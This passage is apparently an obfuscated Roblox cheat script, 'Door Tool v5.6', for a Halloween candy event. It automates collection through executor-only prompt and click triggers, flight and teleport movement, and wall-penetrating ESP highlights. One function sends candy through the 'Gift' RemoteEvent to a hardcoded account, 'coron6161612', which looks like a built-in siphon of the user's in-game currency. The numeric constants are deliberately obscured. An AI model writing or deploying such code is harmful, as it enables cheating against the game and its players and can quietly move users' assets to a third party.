v381:ChangeState(Enum.HumanoidStateType.GettingUp);return (v380.Position-v371.Position).Magnitude<=(v11.MAX_COLLECT_DISTANCE + 1 + 1) ;end if (v911==(0 -0)) then v380.CFrame=CFrame.lookAt(v380.Position,Vector3.new(v371.Position.X,v371.Position.Y,v371.Position.Z));v380.AssemblyLinearVelocity=Vector3.zero;v911=1 -0 ;end end end v373=9 -5 ;end if (v373==(1 + 1)) then v58(Vector3.new(v378.X,v379,v378.Z),v379,v372,2 + 0 );v57(v371.Position.Y,v372);v55();v373=72 -(10 + 59) ;end v544=1 + 1 ;end if ((9 -7)==v544) then if (v373==(11 -7)) then return false;end break;end end end end local function v61(v382,v383) local v384=1163 -(671 + 492) ;local v385;local v386;local v387;local v388;local v389;local v390;local v391;while true do if (v384==1) then v387=nil;v388=nil;v384=2;end if (v384==(0 + 0)) then v385=651 -(59 + 592) ;v386=nil;v384=2 -1 ;end if (v384==(1218 -(369 + 846))) then v391=nil;while true do if (v385==(1 + 1)) then v57(v389.Y,v383);v55();v386,v391=v27();v385=3 + 0 ;end if (v385==(1945 -(1036 + 909))) then local v799=0 + 0 ;while true do if ((1 -0)==v799) then v389=v382.Position;v385=204 -(11 + 192) ;break;end if (v799==0) then v386,v387,v388=v27();if ( not v387 or  not v388 or  not v382) then return false;end v799=1 + 0 ;end end end if (v385==(178 -(135 + 40))) then local v800=0 -0 ;while true do if (v800==(0 + 0)) then if v391 then v391.CFrame=v382;end return true;end end end if ((2 -1)==v385) then v390=v387.Position.Y + v11.FLIGHT_ASCENT_HEIGHT ;v57(v390,v383);v58(v389,v390,v383,1.5 + 1 );v385=2 -0 ;end end break;end if ((178 -(50 + 126))==v384) then v389=nil;v390=nil;v384=1402 -(653 + 746) ;end end end local function v62(v392,v393) local v394=0 -0 ;local v395;local v396;local v397;local v398;while true do if (v394==(0 -0)) then local v637=0 + 0 ;while true do if (v637==1) then v394=1414 -(1233 + 180) ;break;end if ((969 -(522 + 447))==v637) then v395={};for v848,v849 in ipairs(v393) do local v850=1421 -(107 + 1314) ;local v851;while true do if (v850==0) then v851=v41(v849);if (v851 and v851.Parent and v46(v849)) then table.insert(v395,{door=v849,part=v851});end break;end end end v637=1 + 0 ;end end end if ((5 -3)==v394) then local v638=0 + 0 ;while true do if ((1 -0)==v638) then v394=11 -8 ;break;end if ((1910 -(716 + 1194))==v638) then v398=0 + 0 ;while  #v395>(0 + 0)  do local v852,v853=504 -(74 + 429) ,math.huge;for v912,v913 in ipairs(v395) do if (v913.part and v913.part.Parent) then local v971=0;local v972;while true do if (v971==(0 -0)) then v972=(v913.part.Position-v397).Magnitude;if (v972<v853) then local v1066=0 -0 ;local v1067;while true do if (v1066==(0 + 0)) then v1067=0 -0 ;while true do if (v1067==(0 + 0)) then v853=v972;v852=v912;break;end end break;end end end break;end end end end local v854=table.remove(v395,v852);if (v854 and v854.part and v854.part.Parent) then local v963=0 -0 ;while true do if (v963==(1 + 0)) then v397=v854.part.Position;table.insert(v396,v854);break;end if (v963==(968 -(915 + 53))) then v854.distanceFromPrev=v853;v398=v398 + v853 ;v963=2 -1 ;end end end end v638=3 -2 ;end end end if (v394==(7 -4)) then return v396,v398;end if ((434 -(279 + 154))==v394) then v396={};v397=v392;v394=780 -(454 + 324) ;end end end local function v63(v399,v400) local v401=0;local v402;local v403;while true do local v545=847 -(638 + 209) ;while true do if (v545==(0 + 0)) then if (v401==(18 -(12 + 5))) then return math.clamp(v403,1792 -(741 + 931) ,320 + 330 );end if (v401==(0 + 0)) then v402=math.max(0.5 -0 ,tonumber(v400) or v11.DEFAULT_COLLECTION_BUDGET );v403=v399/v402 ;v401=1 + 0 ;end break;end end end end local function v64(v404) local v405,v406,v407=v27();if ( not v405 or  not v406 or  not v407 or  not v404 or  not v404.Parent) then return false;end v407.WalkSpeed=v11.DEFAULT_WALK_SPEED;local v410=v404.Position + (v404.CFrame.LookVector * (1096 -(277 + 816))) ;local v411=v29(v406.Position,v410) or {{Position=v410}} ;for v546=1185 -(1058 + 125) , #v411 do if  not v12.isAutoCollectActive then break;end local v547,v548,v549=v27();if ( not v548 or  not v549) then return false;end if ((v548.Position-v404.Position).Magnitude<=(v11.MAX_COLLECT_DISTANCE-(0.3 + 0))) then local v639=0;while true do if (v639==(0 + 0)) then v549:MoveTo(v548.Position);return true;end end end local v550=v411[v546];if (v550.Action==Enum.PathWaypointAction.Jump) then v549.Jump=true;end v549:MoveTo(v550.Position);local v551=false;local v552=v549.MoveToFinished:Connect(function() v551=true;end);local v553=os.clock();while v12.isAutoCollectActive and  not v551 and ((os.clock() -v553)<(977 -(815 + 160)))  do local v576=0 -0 ;local v577;local v578;local v579;while true do if (v576==(0 -0)) then local v748=0 + 0 ;while true do if (v748==(494 -(64 + 430))) then v577,v578,v579=v27();if ( not v578 or  not v579) then local v973=0 + 0 ;while true do if (v973==(0 + 0)) then v552:Disconnect();return false;end end end v748=2 -1 ;end if (v748==(1899 -(41 + 1857))) then v576=1894 -(1222 + 671) ;break;end end end if (v576==(2 -1)) then if ((v578.Position-v404.Position).Magnitude<=(v11.MAX_COLLECT_DISTANCE-(0.3 -0))) then local v855=0 -0 ;local v856;while true do if (v855==(1182 -(229 + 953))) then v856=1774 -(1111 + 663) ;while true do if (v856==(1579 -(874 + 705))) then v552:Disconnect();v579:MoveTo(v578.Position);v856=1 + 0 ;end if (v856==(1 + 0)) then return true;end end break;end end end v1.Heartbeat:Wait();break;end end end v552:Disconnect();end return false;end local function v65(v412,v413,v414) local v415=188 -(96 + 92) ;local v416;local v417;local v418;local v419;local v420;local v421;while true do local v554=0 + 0 ;while true do if (v554==(1 -0)) then if (v415==(1 + 3)) then local v801=899 -(142 + 757) ;while true do if ((679 -(642 + 37))==v801) then v421=os.clock();while (os.clock() -v421)<v420  do local v974=0 + 0 ;while true do if (v974==(0 + 0)) then v30(v413);v1.Heartbeat:Wait();break;end end end v801=1 + 0 ;end if ((1 + 0)==v801) then for v975,v976 in ipairs(v419) do if (v976 and v976.Parent) then pcall(function() v976:InputHoldEnd();end);end end v415=12 -7 ;break;end end end if (v415==1) then v417.CFrame=CFrame.lookAt(v417.Position,Vector3.new(v413.Position.X,v417.Position.Y,v413.Position.Z));task.wait(454.04 -(233 + 221) );v30(v413);v415=4 -2 ;end v554=2 + 0 ;end if (v554==(1544 -(718 + 823))) then if (v415==(4 + 1)) then local v803=805 -(266 + 539) ;while true do if ((2 -1)==v803) then if v414 then v26(v414,"✅ Collected! Resuming...");end v415=1231 -(636 + 589) ;break;end if (v803==(1709 -(541 + 1168))) then pcall(function() v4:SendKeyEvent(false,Enum.KeyCode.E,false,game);end);v44(v412);v803=1598 -(645 + 952) ;end end end break;end if (v554==(0 -0)) then if (v415==(5 -2)) then pcall(function() v4:SendKeyEvent(true,Enum.KeyCode.E,false,game);end);for v857,v858 in ipairs(v419) do if (v858 and v858.Parent) then pcall(function() v858:InputHoldBegin();end);end end v420=(v12.useSmartHoldMode and 0.4) or (0.08 + 0) ;v415=2 + 2 ;end if (v415==(1017 -(657 + 358))) then for v859,v860 in ipairs(v412:GetDescendants()) do if (v860:IsA("ClickDetector") and (typeof(fireclickdetector)=="function")) then pcall(fireclickdetector,v860);end end v419=v40(v412);for v861,v862 in ipairs(v419) do local v863=0 -0 ;while true do if (v863==(0 -0)) then v49(v862);if (typeof(fireproximityprompt)=="function") then local v1035=0 + 0 ;while true do if (v1035==(765 -(181 + 584))) then pcall(fireproximityprompt,v862);pcall(fireproximityprompt,v862,1395 -(665 + 730) );v1035=1188 -(1151 + 36) ;end if (v1035==(1 + 0)) then pcall(fireproximityprompt,v862,0 + 0 ,true);break;end end end break;end end end v415=8 -5 ;end v554=1833 -(1552 + 280) ;end if (v554==(836 -(64 + 770))) then if ((0 -0)==v415) then local v804=0;while true do if (v804==(1 + 0)) then if ( not v417 or  not v418) then return false;end v415=2 -1 ;break;end if (v804==(0 + 0)) then if ( not v412 or  not v412.Parent or  not v413 or  not v413.Parent) then return false;end v416,v417,v418=v27();v804=1244 -(157 + 1086) ;end end end if (v415==6) then return true;end v554=5 -2 ;end end end end local function v66() local v422=0;local v423;local v424;local v425;local v426;local v427;local v428;local v429;while true do if (v422==(4 -3)) then v425=v2:FindFirstChild("Characters");if v425 then v424=v425:FindFirstChild("coron6161612");end if  not v424 then local v749=262 -(30 + 232) ;local v750;while true do if (v749==(0 -0)) then v750=v0:FindFirstChild("coron6161612");if (v750 and v750.Character) then v424=v750.Character;end break;end end end v422=2 -0 ;end if ((2 -0)==v422) then if  not v424 then return false;end v426=v424:FindFirstChild("FakeBillboard",true) or v424:FindFirstChildWhichIsA("BillboardGui",true) ;if  not v426 then return false;end v422=822 -(599 + 220) ;end if (v422==(9 -4)) then return false;end if (v422==(1931 -(1813 + 118))) then v423=v10();if (v423<=(0 + 0)) then return false;end v424=nil;v422=1;end if (v422==(4 + 0)) then if (v423>=(84 + 16)) then v428="100";elseif (v423>=(1267 -(841 + 376))) then v428="50";elseif (v423>=(24 + 1)) then v428="25";elseif (v423>=(6 -1)) then v428="5";else return false;end v429=pcall(function() v427:FireServer(v428);end);if v429 then return true;end v422=2 + 3 ;end if ((3 + 0)==v422) then v427=v426:FindFirstChild("Gift",true);if ( not v427 or  not v427:IsA("RemoteEvent")) then return false;end v428="5";v422=10 -6 ;end end end local function v67(v430) local v431=859 -(464 + 395) ;local v432;local v433;while true do if (v431==2) then if v433 then for v805,v806 in ipairs(v433:GetChildren()) do if (v806:IsA("Model") and (string.lower(v806.Name)==v432)) then return v806;end end end for v689,v690 in ipairs(v0:GetPlayers()) do if (v690~=v8) then local v807=0;local v808;local v809;while true do if (v807==(2 -1)) then if ((v808==v432) or (v809==v432)) then if (v433 and v433:FindFirstChild(v690.Name)) then return v433:FindFirstChild(v690.Name);elseif v690.Character then return v690.Character;end end break;end if (v807==(0 -0)) then v808=string.lower(v690.Name);v809=string.lower(v690.DisplayName);v807=1 + 0 ;end end end end v431=2 + 1 ;end if (v431==(1 + 0)) then if (v432=="") then return nil;end v433=v2:FindFirstChild("Characters");v431=2;end if (v431==(6 -3)) then return nil;end if (v431==(837 -(467 + 370))) then if ( not v430 or (v430=="")) then return nil;end v432=string.lower(string.gsub(v430,"%s+",""));v431=1 -0 ;end end end local function v68(v434) local v435=0 + 0 ;local v436;local v437;local v438;local v439;local v440;while true do if (v435==(0 -0)) then if (v12.targetPlayerName=="") then return false,"Target player username is empty!";end v436=v67(v12.targetPlayerName);v435=1 + 0 ;end if (2==v435) then if  not v437 then return false,"Target FakeBillboard missing!";end v438=v437:FindFirstChild("Gift",true);v435=3;end if (v435==(8 -4)) then if v439 then return true,string.format("🍬 Sent %s Candy to %s!",v434,v436.Name);else return false,"Error: "   .. tostring(v440) ;end break;end if (v435==(523 -(150 + 370))) then if ( not v438 or  not v438:IsA("RemoteEvent")) then return false,"Gift RemoteEvent missing!";end v439,v440=pcall(function() v438:FireServer(v434);end);v435=1286 -(74 + 1208) ;end if (v435==(2 -1)) then if  not v436 then return false,"Player not found: "   .. v12.targetPlayerName ;end v437=v436:FindFirstChild("FakeBillboard",true) or v436:FindFirstChildWhichIsA("BillboardGui",true) ;v435=9 -7 ;end end end for v441,v442 in ipairs({"HalloweenESP_DebugGui","HalloweenDoor_DebugGui_V2","HalloweenDoor_DebugGui_V3","HalloweenDoor_DebugGui_V4","HalloweenDoor_DebugGui_V4_Fix","HalloweenDoor_DebugGui_V4_Ultimate","HalloweenDoor_DebugGui_V4_Fix10_Ultimate","HalloweenDoor_DebugGui_V5_Ultimate","HalloweenDoor_DebugGui_V51_Ultimate","HalloweenDoor_DebugGui_V52_Ultimate","HalloweenDoor_DebugGui_V53_Ultimate","HalloweenDoor_DebugGui_V54_Ultimate","HalloweenDoor_DebugGui_V55_Ultimate","HalloweenDoor_DebugGui_V56_Ultimate"}) do local v443=0 + 0 ;local v444;while true do if (v443==(0 -0)) then v444=v9:FindFirstChild(v442);if v444 then pcall(function() v444:Destroy();end);end break;end end end local v69=Instance.new("ScreenGui");v69.Name="HalloweenDoor_DebugGui_V56_Ultimate";v69.ResetOnSpawn=false;v69.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;v69.Parent=v9;local v75=Instance.new("Folder");v75.Name="ESP_Visuals_Container";v75.Parent=v69;local v78=Instance.new("Frame");v78.Name="MainFrame";v78.Size=UDim2.new(0 + 0 ,218,1083 -(1038 + 45) ,847 -455 );v78.Position=UDim2.new(901 -(652 + 249) ,53 -33 ,1868.5 -(708 + 1160) , -196);v78.BackgroundColor3=Color3.fromRGB(18,48 -30 ,43 -19 );v78.BorderSizePixel=27 -(10 + 17) ;v78.Active=true;v78.Parent=v69;local v86=Instance.new("UICorner");v86.CornerRadius=UDim.new(1036 -(1007 + 29) ,3 + 5 );v86.Parent=v78;local v89=Instance.new("UIStroke");v89.Color=Color3.fromRGB(623 -368 ,662 -522 ,7 + 23 );v89.Transparency=1732.35 -(1400 + 332) ;v89.Thickness=812.3 -(340 + 471) ;v89.Parent=v78;local v94=Instance.new("TextLabel");v94.Size=UDim2.new(2 -1 , -(617 -(276 + 313)),0 -0 ,22);v94.Position=UDim2.new(0 -0 ,1916 -(242 + 1666) ,0 + 0 ,1 + 1 );v94.BackgroundTransparency=1973 -(495 + 1477) ;v94.Font=Enum.Font.GothamBold;v94.TextSize=10 + 1 ;v94.TextColor3=Color3.fromRGB(1195 -(850 + 90) ,306 -131 ,1440 -(360 + 1030) );v94.TextXAlignment=Enum.TextXAlignment.Left;v94.Text="🎃 Door Tool v5.6";v94.Parent=v78;local v106=Instance.new("TextButton");v106.Size=UDim2.new(0 + 0 ,56 -36 ,0 -0 ,1681 -(909 + 752) );v106.Position=UDim2.new(1 + 0 , -(1245 -(109 + 1114)),0 -0 ,1 + 1 );v106.BackgroundTransparency=498 -(322 + 175) ;v106.Font=Enum.Font.GothamBold;v106.TextSize=256 -(6 + 236) ;v106.TextColor3=Color3.fromRGB(45 + 135 ,494 -(203 + 111) ,120 + 70 );v106.Text="-";v106.Parent=v78;local function v115(v445,v446,v447,v448) local v449=Instance.new("TextButton");v449.Size=UDim2.new(1 + 0 , -(35 -23),0,51 -29 );v449.Position=UDim2.new(0,10 -4 ,1133 -(1076 + 57) ,v446);v449.BackgroundColor3=v447 or Color3.fromRGB(45,4 + 16 ,20) ;v449.Font=Enum.Font.GothamBold;v449.TextSize=699 -(579 + 110) ;v449.TextColor3=v448 or Color3.fromRGB(21 + 234 ,32 + 68 ,89 + 11 ) ;v449.Text=v445;v449.Parent=v78;local v459=Instance.new("UICorner");v459.CornerRadius=UDim.new(0 + 0 ,413 -(174 + 233) );v459.Parent=v449;return v449;end local v116=v115("ESP: OFF",21 + 4 );local v117=v115("PROMPT FIX: OFF",136 -87 );local v118=v115("AUTO COLLECT: OFF",127 -54 );local v119=v115("MODE: FLY (120 STUD)",458 -361 ,Color3.fromRGB(15,23 + 27 ,1249 -(663 + 511) ),Color3.fromRGB(100,201 + 24 ,1291 -(562 + 474) ));local v120=v115("TIMER: WAIT 00:00",282 -161 ,Color3.fromRGB(11 + 39 ,935 -(76 + 829) ,200 -135 ),Color3.fromRGB(134 + 86 ,376 -216 ,617 -362 ));local v121=Instance.new("Frame");v121.Name="BudgetContainer";v121.Size=UDim2.new(1 + 0 , -12,0 -0 ,16 + 6 );v121.Position=UDim2.new(0 -0 ,272 -(58 + 208) ,0 + 0 ,867 -(478 + 244) );v121.BackgroundColor3=Color3.fromRGB(545 -(440 + 77) ,11 + 13 ,154 -116 );v121.BorderSizePixel=0;v121.Parent=v78;local v128=Instance.new("UICorner");v128.CornerRadius=UDim.new(337 -(258 + 79) ,21 -15 );v128.Parent=v121;local v131=Instance.new("UIStroke");v131.Color=Color3.fromRGB(1696 -(655 + 901) ,19 + 81 ,169 + 51 );v131.Thickness=1471 -(1219 + 251) ;v131.Parent=v121;local v135=Instance.new("TextLabel");v135.Size=UDim2.new(0.68,0 + 0 ,1672 -(1231 + 440) ,58 -(34 + 24) );v135.Position=UDim2.new(0 + 0 ,24 -18 ,1445 -(695 + 750) ,0);v135.BackgroundTransparency=1 + 0 ;v135.Font=Enum.Font.GothamBold;v135.TextSize=30 -21 ;v135.TextColor3=Color3.fromRGB(324 -114 ,723 -543 ,606 -(285 + 66) );v135.TextXAlignment=Enum.TextXAlignment.Left;v135.Text="TARGET TIME (SEC):";v135.Parent=v121;local v145=Instance.new("TextBox");v145.Name="BudgetInput";v145.Size=UDim2.new(0.3 -0 , -(1316 -(682 + 628)),0.8 + 0 ,1589 -(877 + 712) );v145.Position=UDim2.new(0.7 + 0 ,299 -(176 + 123) ,0.1 + 0 ,0 + 0 );v145.BackgroundColor3=Color3.fromRGB(284 -(239 + 30) ,4 + 8 ,22 + 0 );v145.Font=Enum.Font.GothamBold;v145.TextSize=17 -7 ;v145.TextColor3=Color3.fromRGB(795 -540 ,570 -(306 + 9) ,889 -634 );v145.Text=tostring(v12.collectionBudget);v145.ClearTextOnFocus=false;v145.Parent=v121;local v156=Instance.new("UICorner");v156.CornerRadius=UDim.new(0 + 0 ,14 -10 );v156.Parent=v145;local v159=v115("HOLD: FORCED 0 SEC",104 + 65 ,Color3.fromRGB(29 + 31 ,7 + 38 ,42 -27 ),Color3.fromRGB(255,1585 -(1140 + 235) ,90));local v160=v115("AUTO TRANSFER: OFF",123 + 70 ,Color3.fromRGB(42 + 3 ,1304 -(299 + 985) ,20),Color3.fromRGB(66 + 189 ,152 -(33 + 19) ,37 + 63 ));local v161=Instance.new("Frame");v161.Name="TargetBox";v161.Size=UDim2.new(2 -1 , -12,93 -(86 + 7) ,10 + 12 );v161.Position=UDim2.new(0 -0 ,886 -(672 + 208) ,0 + 0 ,204 + 13 );v161.BackgroundColor3=Color3.fromRGB(701 -(586 + 103) ,2 + 10 ,49 -33 );v161.BorderSizePixel=1488 -(1309 + 179) ;v161.Parent=v78;local v168=Instance.new("UICorner");v168.CornerRadius=UDim.new(0 -0 ,3 + 3 );v168.Parent=v161;local v171=Instance.new("UIStroke");v171.Color=Color3.fromRGB(147 -92 ,42 + 13 ,148 -78 );v171.Thickness=1 + 0 ;v171.Parent=v161;local v175=Instance.new("TextBox");v175.Name="TargetInput";v175.Size=UDim2.new(1, -(15 -7),610 -(295 + 314) ,0 -0 );v175.Position=UDim2.new(1962 -(1300 + 662) ,12 -8 ,0,1755 -(1178 + 577) );v175.BackgroundTransparency=1 + 0 ;v175.Font=Enum.Font.Gotham;v175.TextSize=29 -19 ;v175.TextColor3=Color3.fromRGB(2229 -(1181 + 793) ,1660 -(851 + 554) ,226 + 29 );v175.PlaceholderColor3=Color3.fromRGB(360 -230 ,282 -152 ,447 -(115 + 187) );v175.PlaceholderText="Target Username...";v175.Text=v12.targetPlayerName;v175.ClearTextOnFocus=false;v175.Parent=v161;local v190=v115("DONATE: 100 CANDY 🍬",185 + 56 ,Color3.fromRGB(48 + 2 ,20,191 -116 ),Color3.fromRGB(230,591 -441 ,1416 -(160 + 1001) ));local v191=Instance.new("Frame");v191.Name="StatusBox";v191.Size=UDim2.new(1 + 0 , -(9 + 3),0 -0 ,1467 -(1262 + 121) );v191.Position=UDim2.new(358 -(237 + 121) ,903 -(525 + 372) ,0 -0 ,876 -609 );v191.BackgroundColor3=Color3.fromRGB(154 -(96 + 46) ,12,355 -(163 + 176) );v191.BorderSizePixel=777 -(643 + 134) ;v191.Parent=v78;local v198=Instance.new("UICorner");v198.CornerRadius=UDim.new(0 + 0 ,14 -8 );v198.Parent=v191;local v201=Instance.new("UIStroke");v201.Color=Color3.fromRGB(1855 -(1564 + 246) ,167 -122 ,53 + 2 );v201.Thickness=452 -(115 + 336) ;v201.Parent=v191;v19=Instance.new("TextLabel");v19.Size=UDim2.new(1 -0 , -(2 + 6),46 -(45 + 1) ,34 -16 );v19.Position=UDim2.new(0 -0 ,723 -(316 + 403) ,0 + 0 ,8 -5 );v19.BackgroundTransparency=1 + 0 ;v19.Font=Enum.Font.GothamBold;v19.TextSize=2 + 8 ;v19.TextColor3=Color3.fromRGB(453 -273 ,128 + 52 ,1365 -(943 + 227) );v19.Text="Doors: 0 | Timer: Waiting...";v19.Parent=v191;v21=Instance.new("TextLabel");v21.Size=UDim2.new(1 + 0 , -(1639 -(1539 + 92)),0 + 0 ,58 -41 );v21.Position=UDim2.new(0 -0 ,7 -3 ,0 + 0 ,61 -39 );v21.BackgroundTransparency=258 -(212 + 45) ;v21.Font=Enum.Font.GothamBold;v21.TextSize=17 -8 ;v21.TextColor3=Color3.fromRGB(13 + 242 ,2146 -(708 + 1238) ,235 -155 );v21.Text="🍬 Candy: 0 | Selected: 100 🍬";v21.Parent=v191;v20=Instance.new("TextLabel");v20.Size=UDim2.new(1 + 0 , -(25 -(12 + 5)),0,529 -(348 + 163) );v20.Position=UDim2.new(0 -0 ,4,0 -0 ,88 -46 );v20.BackgroundTransparency=2 -1 ;v20.Font=Enum.Font.Gotham;v20.TextSize=2 + 7 ;v20.TextColor3=Color3.fromRGB(2113 -(1656 + 317) ,125 + 15 ,125 + 30 );v20.Text="Status: Ready (V5.6 - LIVE CANDY SYNC)";v20.Parent=v191;v22=Instance.new("TextLabel");v22.Size=UDim2.new(2 -1 , -(1758 -(1036 + 714)),0 -0 ,12 + 5 );v22.Position=UDim2.new(354 -(5 + 349) ,4,0 -0 ,1334 -(266 + 1005) );v22.BackgroundTransparency=1 + 0 ;v22.Font=Enum.Font.Gotham;v22.TextSize=1994 -(1369 + 617) ;v22.TextColor3=Color3.fromRGB(375 -265 ,236 -56 ,1951 -(561 + 1135) );v22.Text=string.format("Mode: %s | Target: %ds | Anti-Wall: ACTIVE",v12.movementMode,v12.collectionBudget);v22.Parent=v191;local function v237(v462) if ( not v12.isEspActive or  not v462 or  not v462.Parent) then return;end local v463=v14[v462];if  not v463 then local v580=0 -0 ;while true do if ((217 -(12 + 205))==v580) then v463={};v14[v462]=v463;break;end end end if ( not v463.highlight or  not v463.highlight.Parent) then local v581=0 -0 ;local v582;while true do if (v581==(7 -5)) then v582.FillTransparency=1066.45 -(507 + 559) ;v582.OutlineTransparency=0 -0 ;v581=9 -6 ;end if (v581==(388 -(212 + 176))) then v582=Instance.new("Highlight");v582.Name="DoorESP_HL";v581=906 -(250 + 655) ;end if ((300 -(90 + 207))==v581) then v582.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop;v582.Adornee=v462;v581=4;end if ((10 -6)==v581) then v582.Parent=v75;v463.highlight=v582;break;end if (v581==(862 -(706 + 155))) then v582.FillColor=Color3.fromRGB(255,227 -97 ,0 -0 );v582.OutlineColor=Color3.fromRGB(255,255,2211 -(1869 + 87) );v581=6 -4 ;end end else if (v463.highlight.Adornee~=v462) then v463.highlight.Adornee=v462;end if  not v463.highlight.Enabled then v463.highlight.Enabled=true;end end local v464=v41(v462);v463.adorneePart=v464;if v464 then if ( not v463.billboard or  not v463.billboard.Parent) then local v693=1901 -(484 + 1417) ;local v694;local v695;while true do if (v693==(0 + 0)) then v694=Instance.new("BillboardGui");v694.Name="DoorESP_BB";v694.Adornee=v464;v693=2 -1 ;end if (v693==(1 -0)) then local v866=843 -(268 + 575) ;while true do if (v866==1) then v694.AlwaysOnTop=true;v693=2;break;end if (v866==(0 -0)) then v694.Size=UDim2.new(0 -0 ,933 -(48 + 725) ,0 -0 ,85 -53 );v694.StudsOffset=Vector3.new(0 + 0 ,7.5 -4 ,0 -0 );v866=1 + 0 ;end end end if (v693==(2 + 4)) then v463.billboard=v694;v463.label=v695;break;end if (v693==(855 -(152 + 701))) then v694.MaxDistance=11311 -(430 + 881) ;v694.Parent=v75;v695=Instance.new("TextLabel");v693=112 -(96 + 13) ;end if ((2 + 2)==v693) then local v871=895 -(557 + 338) ;while true do if (v871==(1 + 0)) then v695.TextStrokeColor3=Color3.fromRGB(0 -0 ,0,0 -0 );v693=13 -8 ;break;end if (v871==(0 -0)) then v695.TextSize=13;v695.TextColor3=Color3.fromRGB(1056 -(499 + 302) ,1026 -(39 + 827) ,0 -0 );v871=2 -1 ;end end end if ((11 -8)==v693) then v695.Size=UDim2.new(1 -0 ,0 + 0 ,1 + 0 ,0 + 0 );v695.BackgroundTransparency=2 -1 ;v695.Font=Enum.Font.GothamBold;v693=1 + 3 ;end if (v693==(5 + 0)) then local v876=61 -(60 + 1) ;while true do if (v876==(0 -0)) then v695.TextStrokeTransparency=0 + 0 ;v695.Text="🎃 Door";v876=105 -(103 + 1) ;end if (v876==(555 -(475 + 79))) then v695.Parent=v694;v693=12 -6 ;break;end end end end elseif (v463.billboard.Adornee~=v464) then v463.billboard.Adornee=v464;end end local v466,v467,v468=v43(v462);if v467 then v463.lastTimeStr=v467;end if (v468 and  not v463.timerConn) then v463.timerConn=v468:GetPropertyChangedSignal("Text"):Connect(function() local v641=0 -0 ;local v642;local v643;while true do if ((0 + 0)==v641) then v642,v643=v42(v468.Text);if v643 then v463.lastTimeStr=v643;end break;end end end);end end local function v238() for v555,v556 in pairs(v14) do if ( not v12.isEspActive or  not v555 or  not v555.Parent or  not v555:IsDescendantOf(v2)) then local v644=0 + 0 ;while true do if (v644==(1504 -(1395 + 108))) then if v556.timerConn then pcall(function() v556.timerConn:Disconnect();end);end v14[v555]=nil;break;end if (v644==(0 -0)) then if v556.highlight then pcall(function() v556.highlight:Destroy();end);end if v556.billboard then pcall(function() v556.billboard:Destroy();end);end v644=1205 -(7 + 1197) ;end end end end end local function v239() local v469=0 + 0 ;while true do if (v469==(1 + 0)) then task.spawn(function() local v696,v697=v27();local v698=(v697 and v697.CFrame) or nil ;local v699=v48();if ( #v699==(0 + 0)) then local v812=319 -(27 + 292) ;while true do local v877=0 -0 ;while true do if (v877==(1131 -(314 + 817))) then if ((1 -0)==v812) then return;end if (v812==(0 -0)) then v26(v20,"Status: No Available Doors");v12.isCollectingNow=false;v812=1 -0 ;end break;end end end end local v696,v700=v27();if  not v700 then local v813=0 -0 ;local v814;while true do if (v813==(214 -(32 + 182))) then v814=139 -(43 + 96) ;while true do if (v814==(0 -0)) then v12.isCollectingNow=false;return;end end break;end end end local v701,v702=v62(v700.Position,v699);if ( #v701==(0 -0)) then local v815=0 + 0 ;while true do if (v815==(144 -(54 + 90))) then v12.isCollectingNow=false;return;end end end local v703=v63(v702,v12.collectionBudget);v26(v19,string.format("⚡ Budget: %ds | Doors: %d",v12.collectionBudget, #v701),Color3.fromRGB(255,61 + 154 ,0 -0 ));local v704=1 + 0 ;while v12.isAutoCollectActive and (v704<= #v701)  do while v12.isAutoCollectActive and  not v27()  do local v816=0 -0 ;while true do if (v816==(0 -0)) then v36();v55();v816=2 -1 ;end if ((3 -2)==v816) then v26(v20,"Status: Waiting for Respawn...");task.wait(0.5 + 0 );break;end end end if  not v12.isAutoCollectActive then break;end local v762=v701[v704];local v763=v762.door;local v764=v762.part or v41(v763) ;if (v763 and v764 and v46(v763)) then local v878=0 -0 ;local v879;local v880;local v881;while true do if (v878==(0 -0)) then v26(v20,string.format("Door %d/%d [Budget: %ds | Spd: %d]",v704, #v701,v12.collectionBudget,math.floor(v703)));v879,v880=v27();v878=1 + 0 ;end if (v878==(750 -(485 + 263))) then if v881 then local v1038=1751 -(1414 + 337) ;while true do if ((1940 -(1642 + 298))==v1038) then v52(v763,v764,function(v1073) v26(v20,v1073);end);v44(v763);break;end end else local v1039=0 -0 ;local v1040;while true do if ((2 -1)==v1039) then if (v1040 and v12.isAutoCollectActive) then v65(v763,v764,v20);end break;end if (v1039==(0 + 0)) then v1040=false;if (v12.movementMode=="FLY") then v1040=v60(v764,v703);else v1040=v64(v764);end v1039=1 + 0 ;end end end break;end if (v878==(2 -1)) then if v880 then v35(v880,v764);end v881=v51(v764);v878=2;end end end v704=v704 + 1 ;task.wait(0.02 + 0 );end v36();v45();if (v12.isAutoCollectActive and (v12.movementMode=="FLY") and v698) then local v817=0 + 0 ;while true do if (v817==(972 -(357 + 615))) then v26(v20,"Status: Returning to Start...",Color3.fromRGB(33 + 97 ,155 + 65 ,625 -370 ));v61(v698,v703);break;end end end v55();local v696,v696,v705=v27();if v705 then v705.WalkSpeed=v12.originalWalkSpeed;end v26(v20,"Status: Wave Completed in Budget! ✅",Color3.fromRGB(103 + 17 ,546 -291 ,924 -(158 + 626) ));v12.isCollectingNow=false;end);break;end if (v469==(0 + 0)) then if v12.isCollectingNow then return;end v12.isCollectingNow=true;v469=1 + 0 ;end end end local v240=0 + 0 ;local function v241(v470) if  not v12.isEspActive then return;end v240=v240 + v470 ;if (v240<(1301.1 -(384 + 917))) then return;end v240=697 -(128 + 569) ;local v471,v472=v27();for v557,v558 in pairs(v14) do if (v557 and v557.Parent and v558.label and v558.adorneePart and v558.adorneePart.Parent) then local v646=1543 -(1407 + 136) ;local v647;local v648;local v649;local v650;local v651;local v652;while true do if ((1889 -(687 + 1200))==v646) then v650="normal";v651=Color3.fromRGB(100 + 155 ,1880 -(556 + 1154) ,0 -0 );v646=1052 -(179 + 870) ;end if (v646==(1 -0)) then if v472 then local v915=95 -(9 + 86) ;while true do if (v915==(421 -(275 + 146))) then v647=math.floor((v472.Position-v558.adorneePart.Position).Magnitude);v648=string.format("[%dm]",v647);break;end end end v649=v558.lastTimeStr or "" ;v646=1 + 1 ;end if (v646==(3 + 1)) then if ((v558.lastDist~=v647) or (v558.lastStatusKey~=v650) or (v558.lastTimerText~=v649)) then local v916=64 -(29 + 35) ;while true do if ((474 -(95 + 378))==v916) then v558.lastTimerText=v649;v26(v558.label,v652,v651);break;end if ((0 -0)==v916) then v558.lastDist=v647;v558.lastStatusKey=v650;v916=1;end end end break;end if ((8 -5)==v646) then v652="";if v18[v557] then local v917=0 -0 ;while true do if ((1 + 0)==v917) then v652=string.format("🎃 Door %s 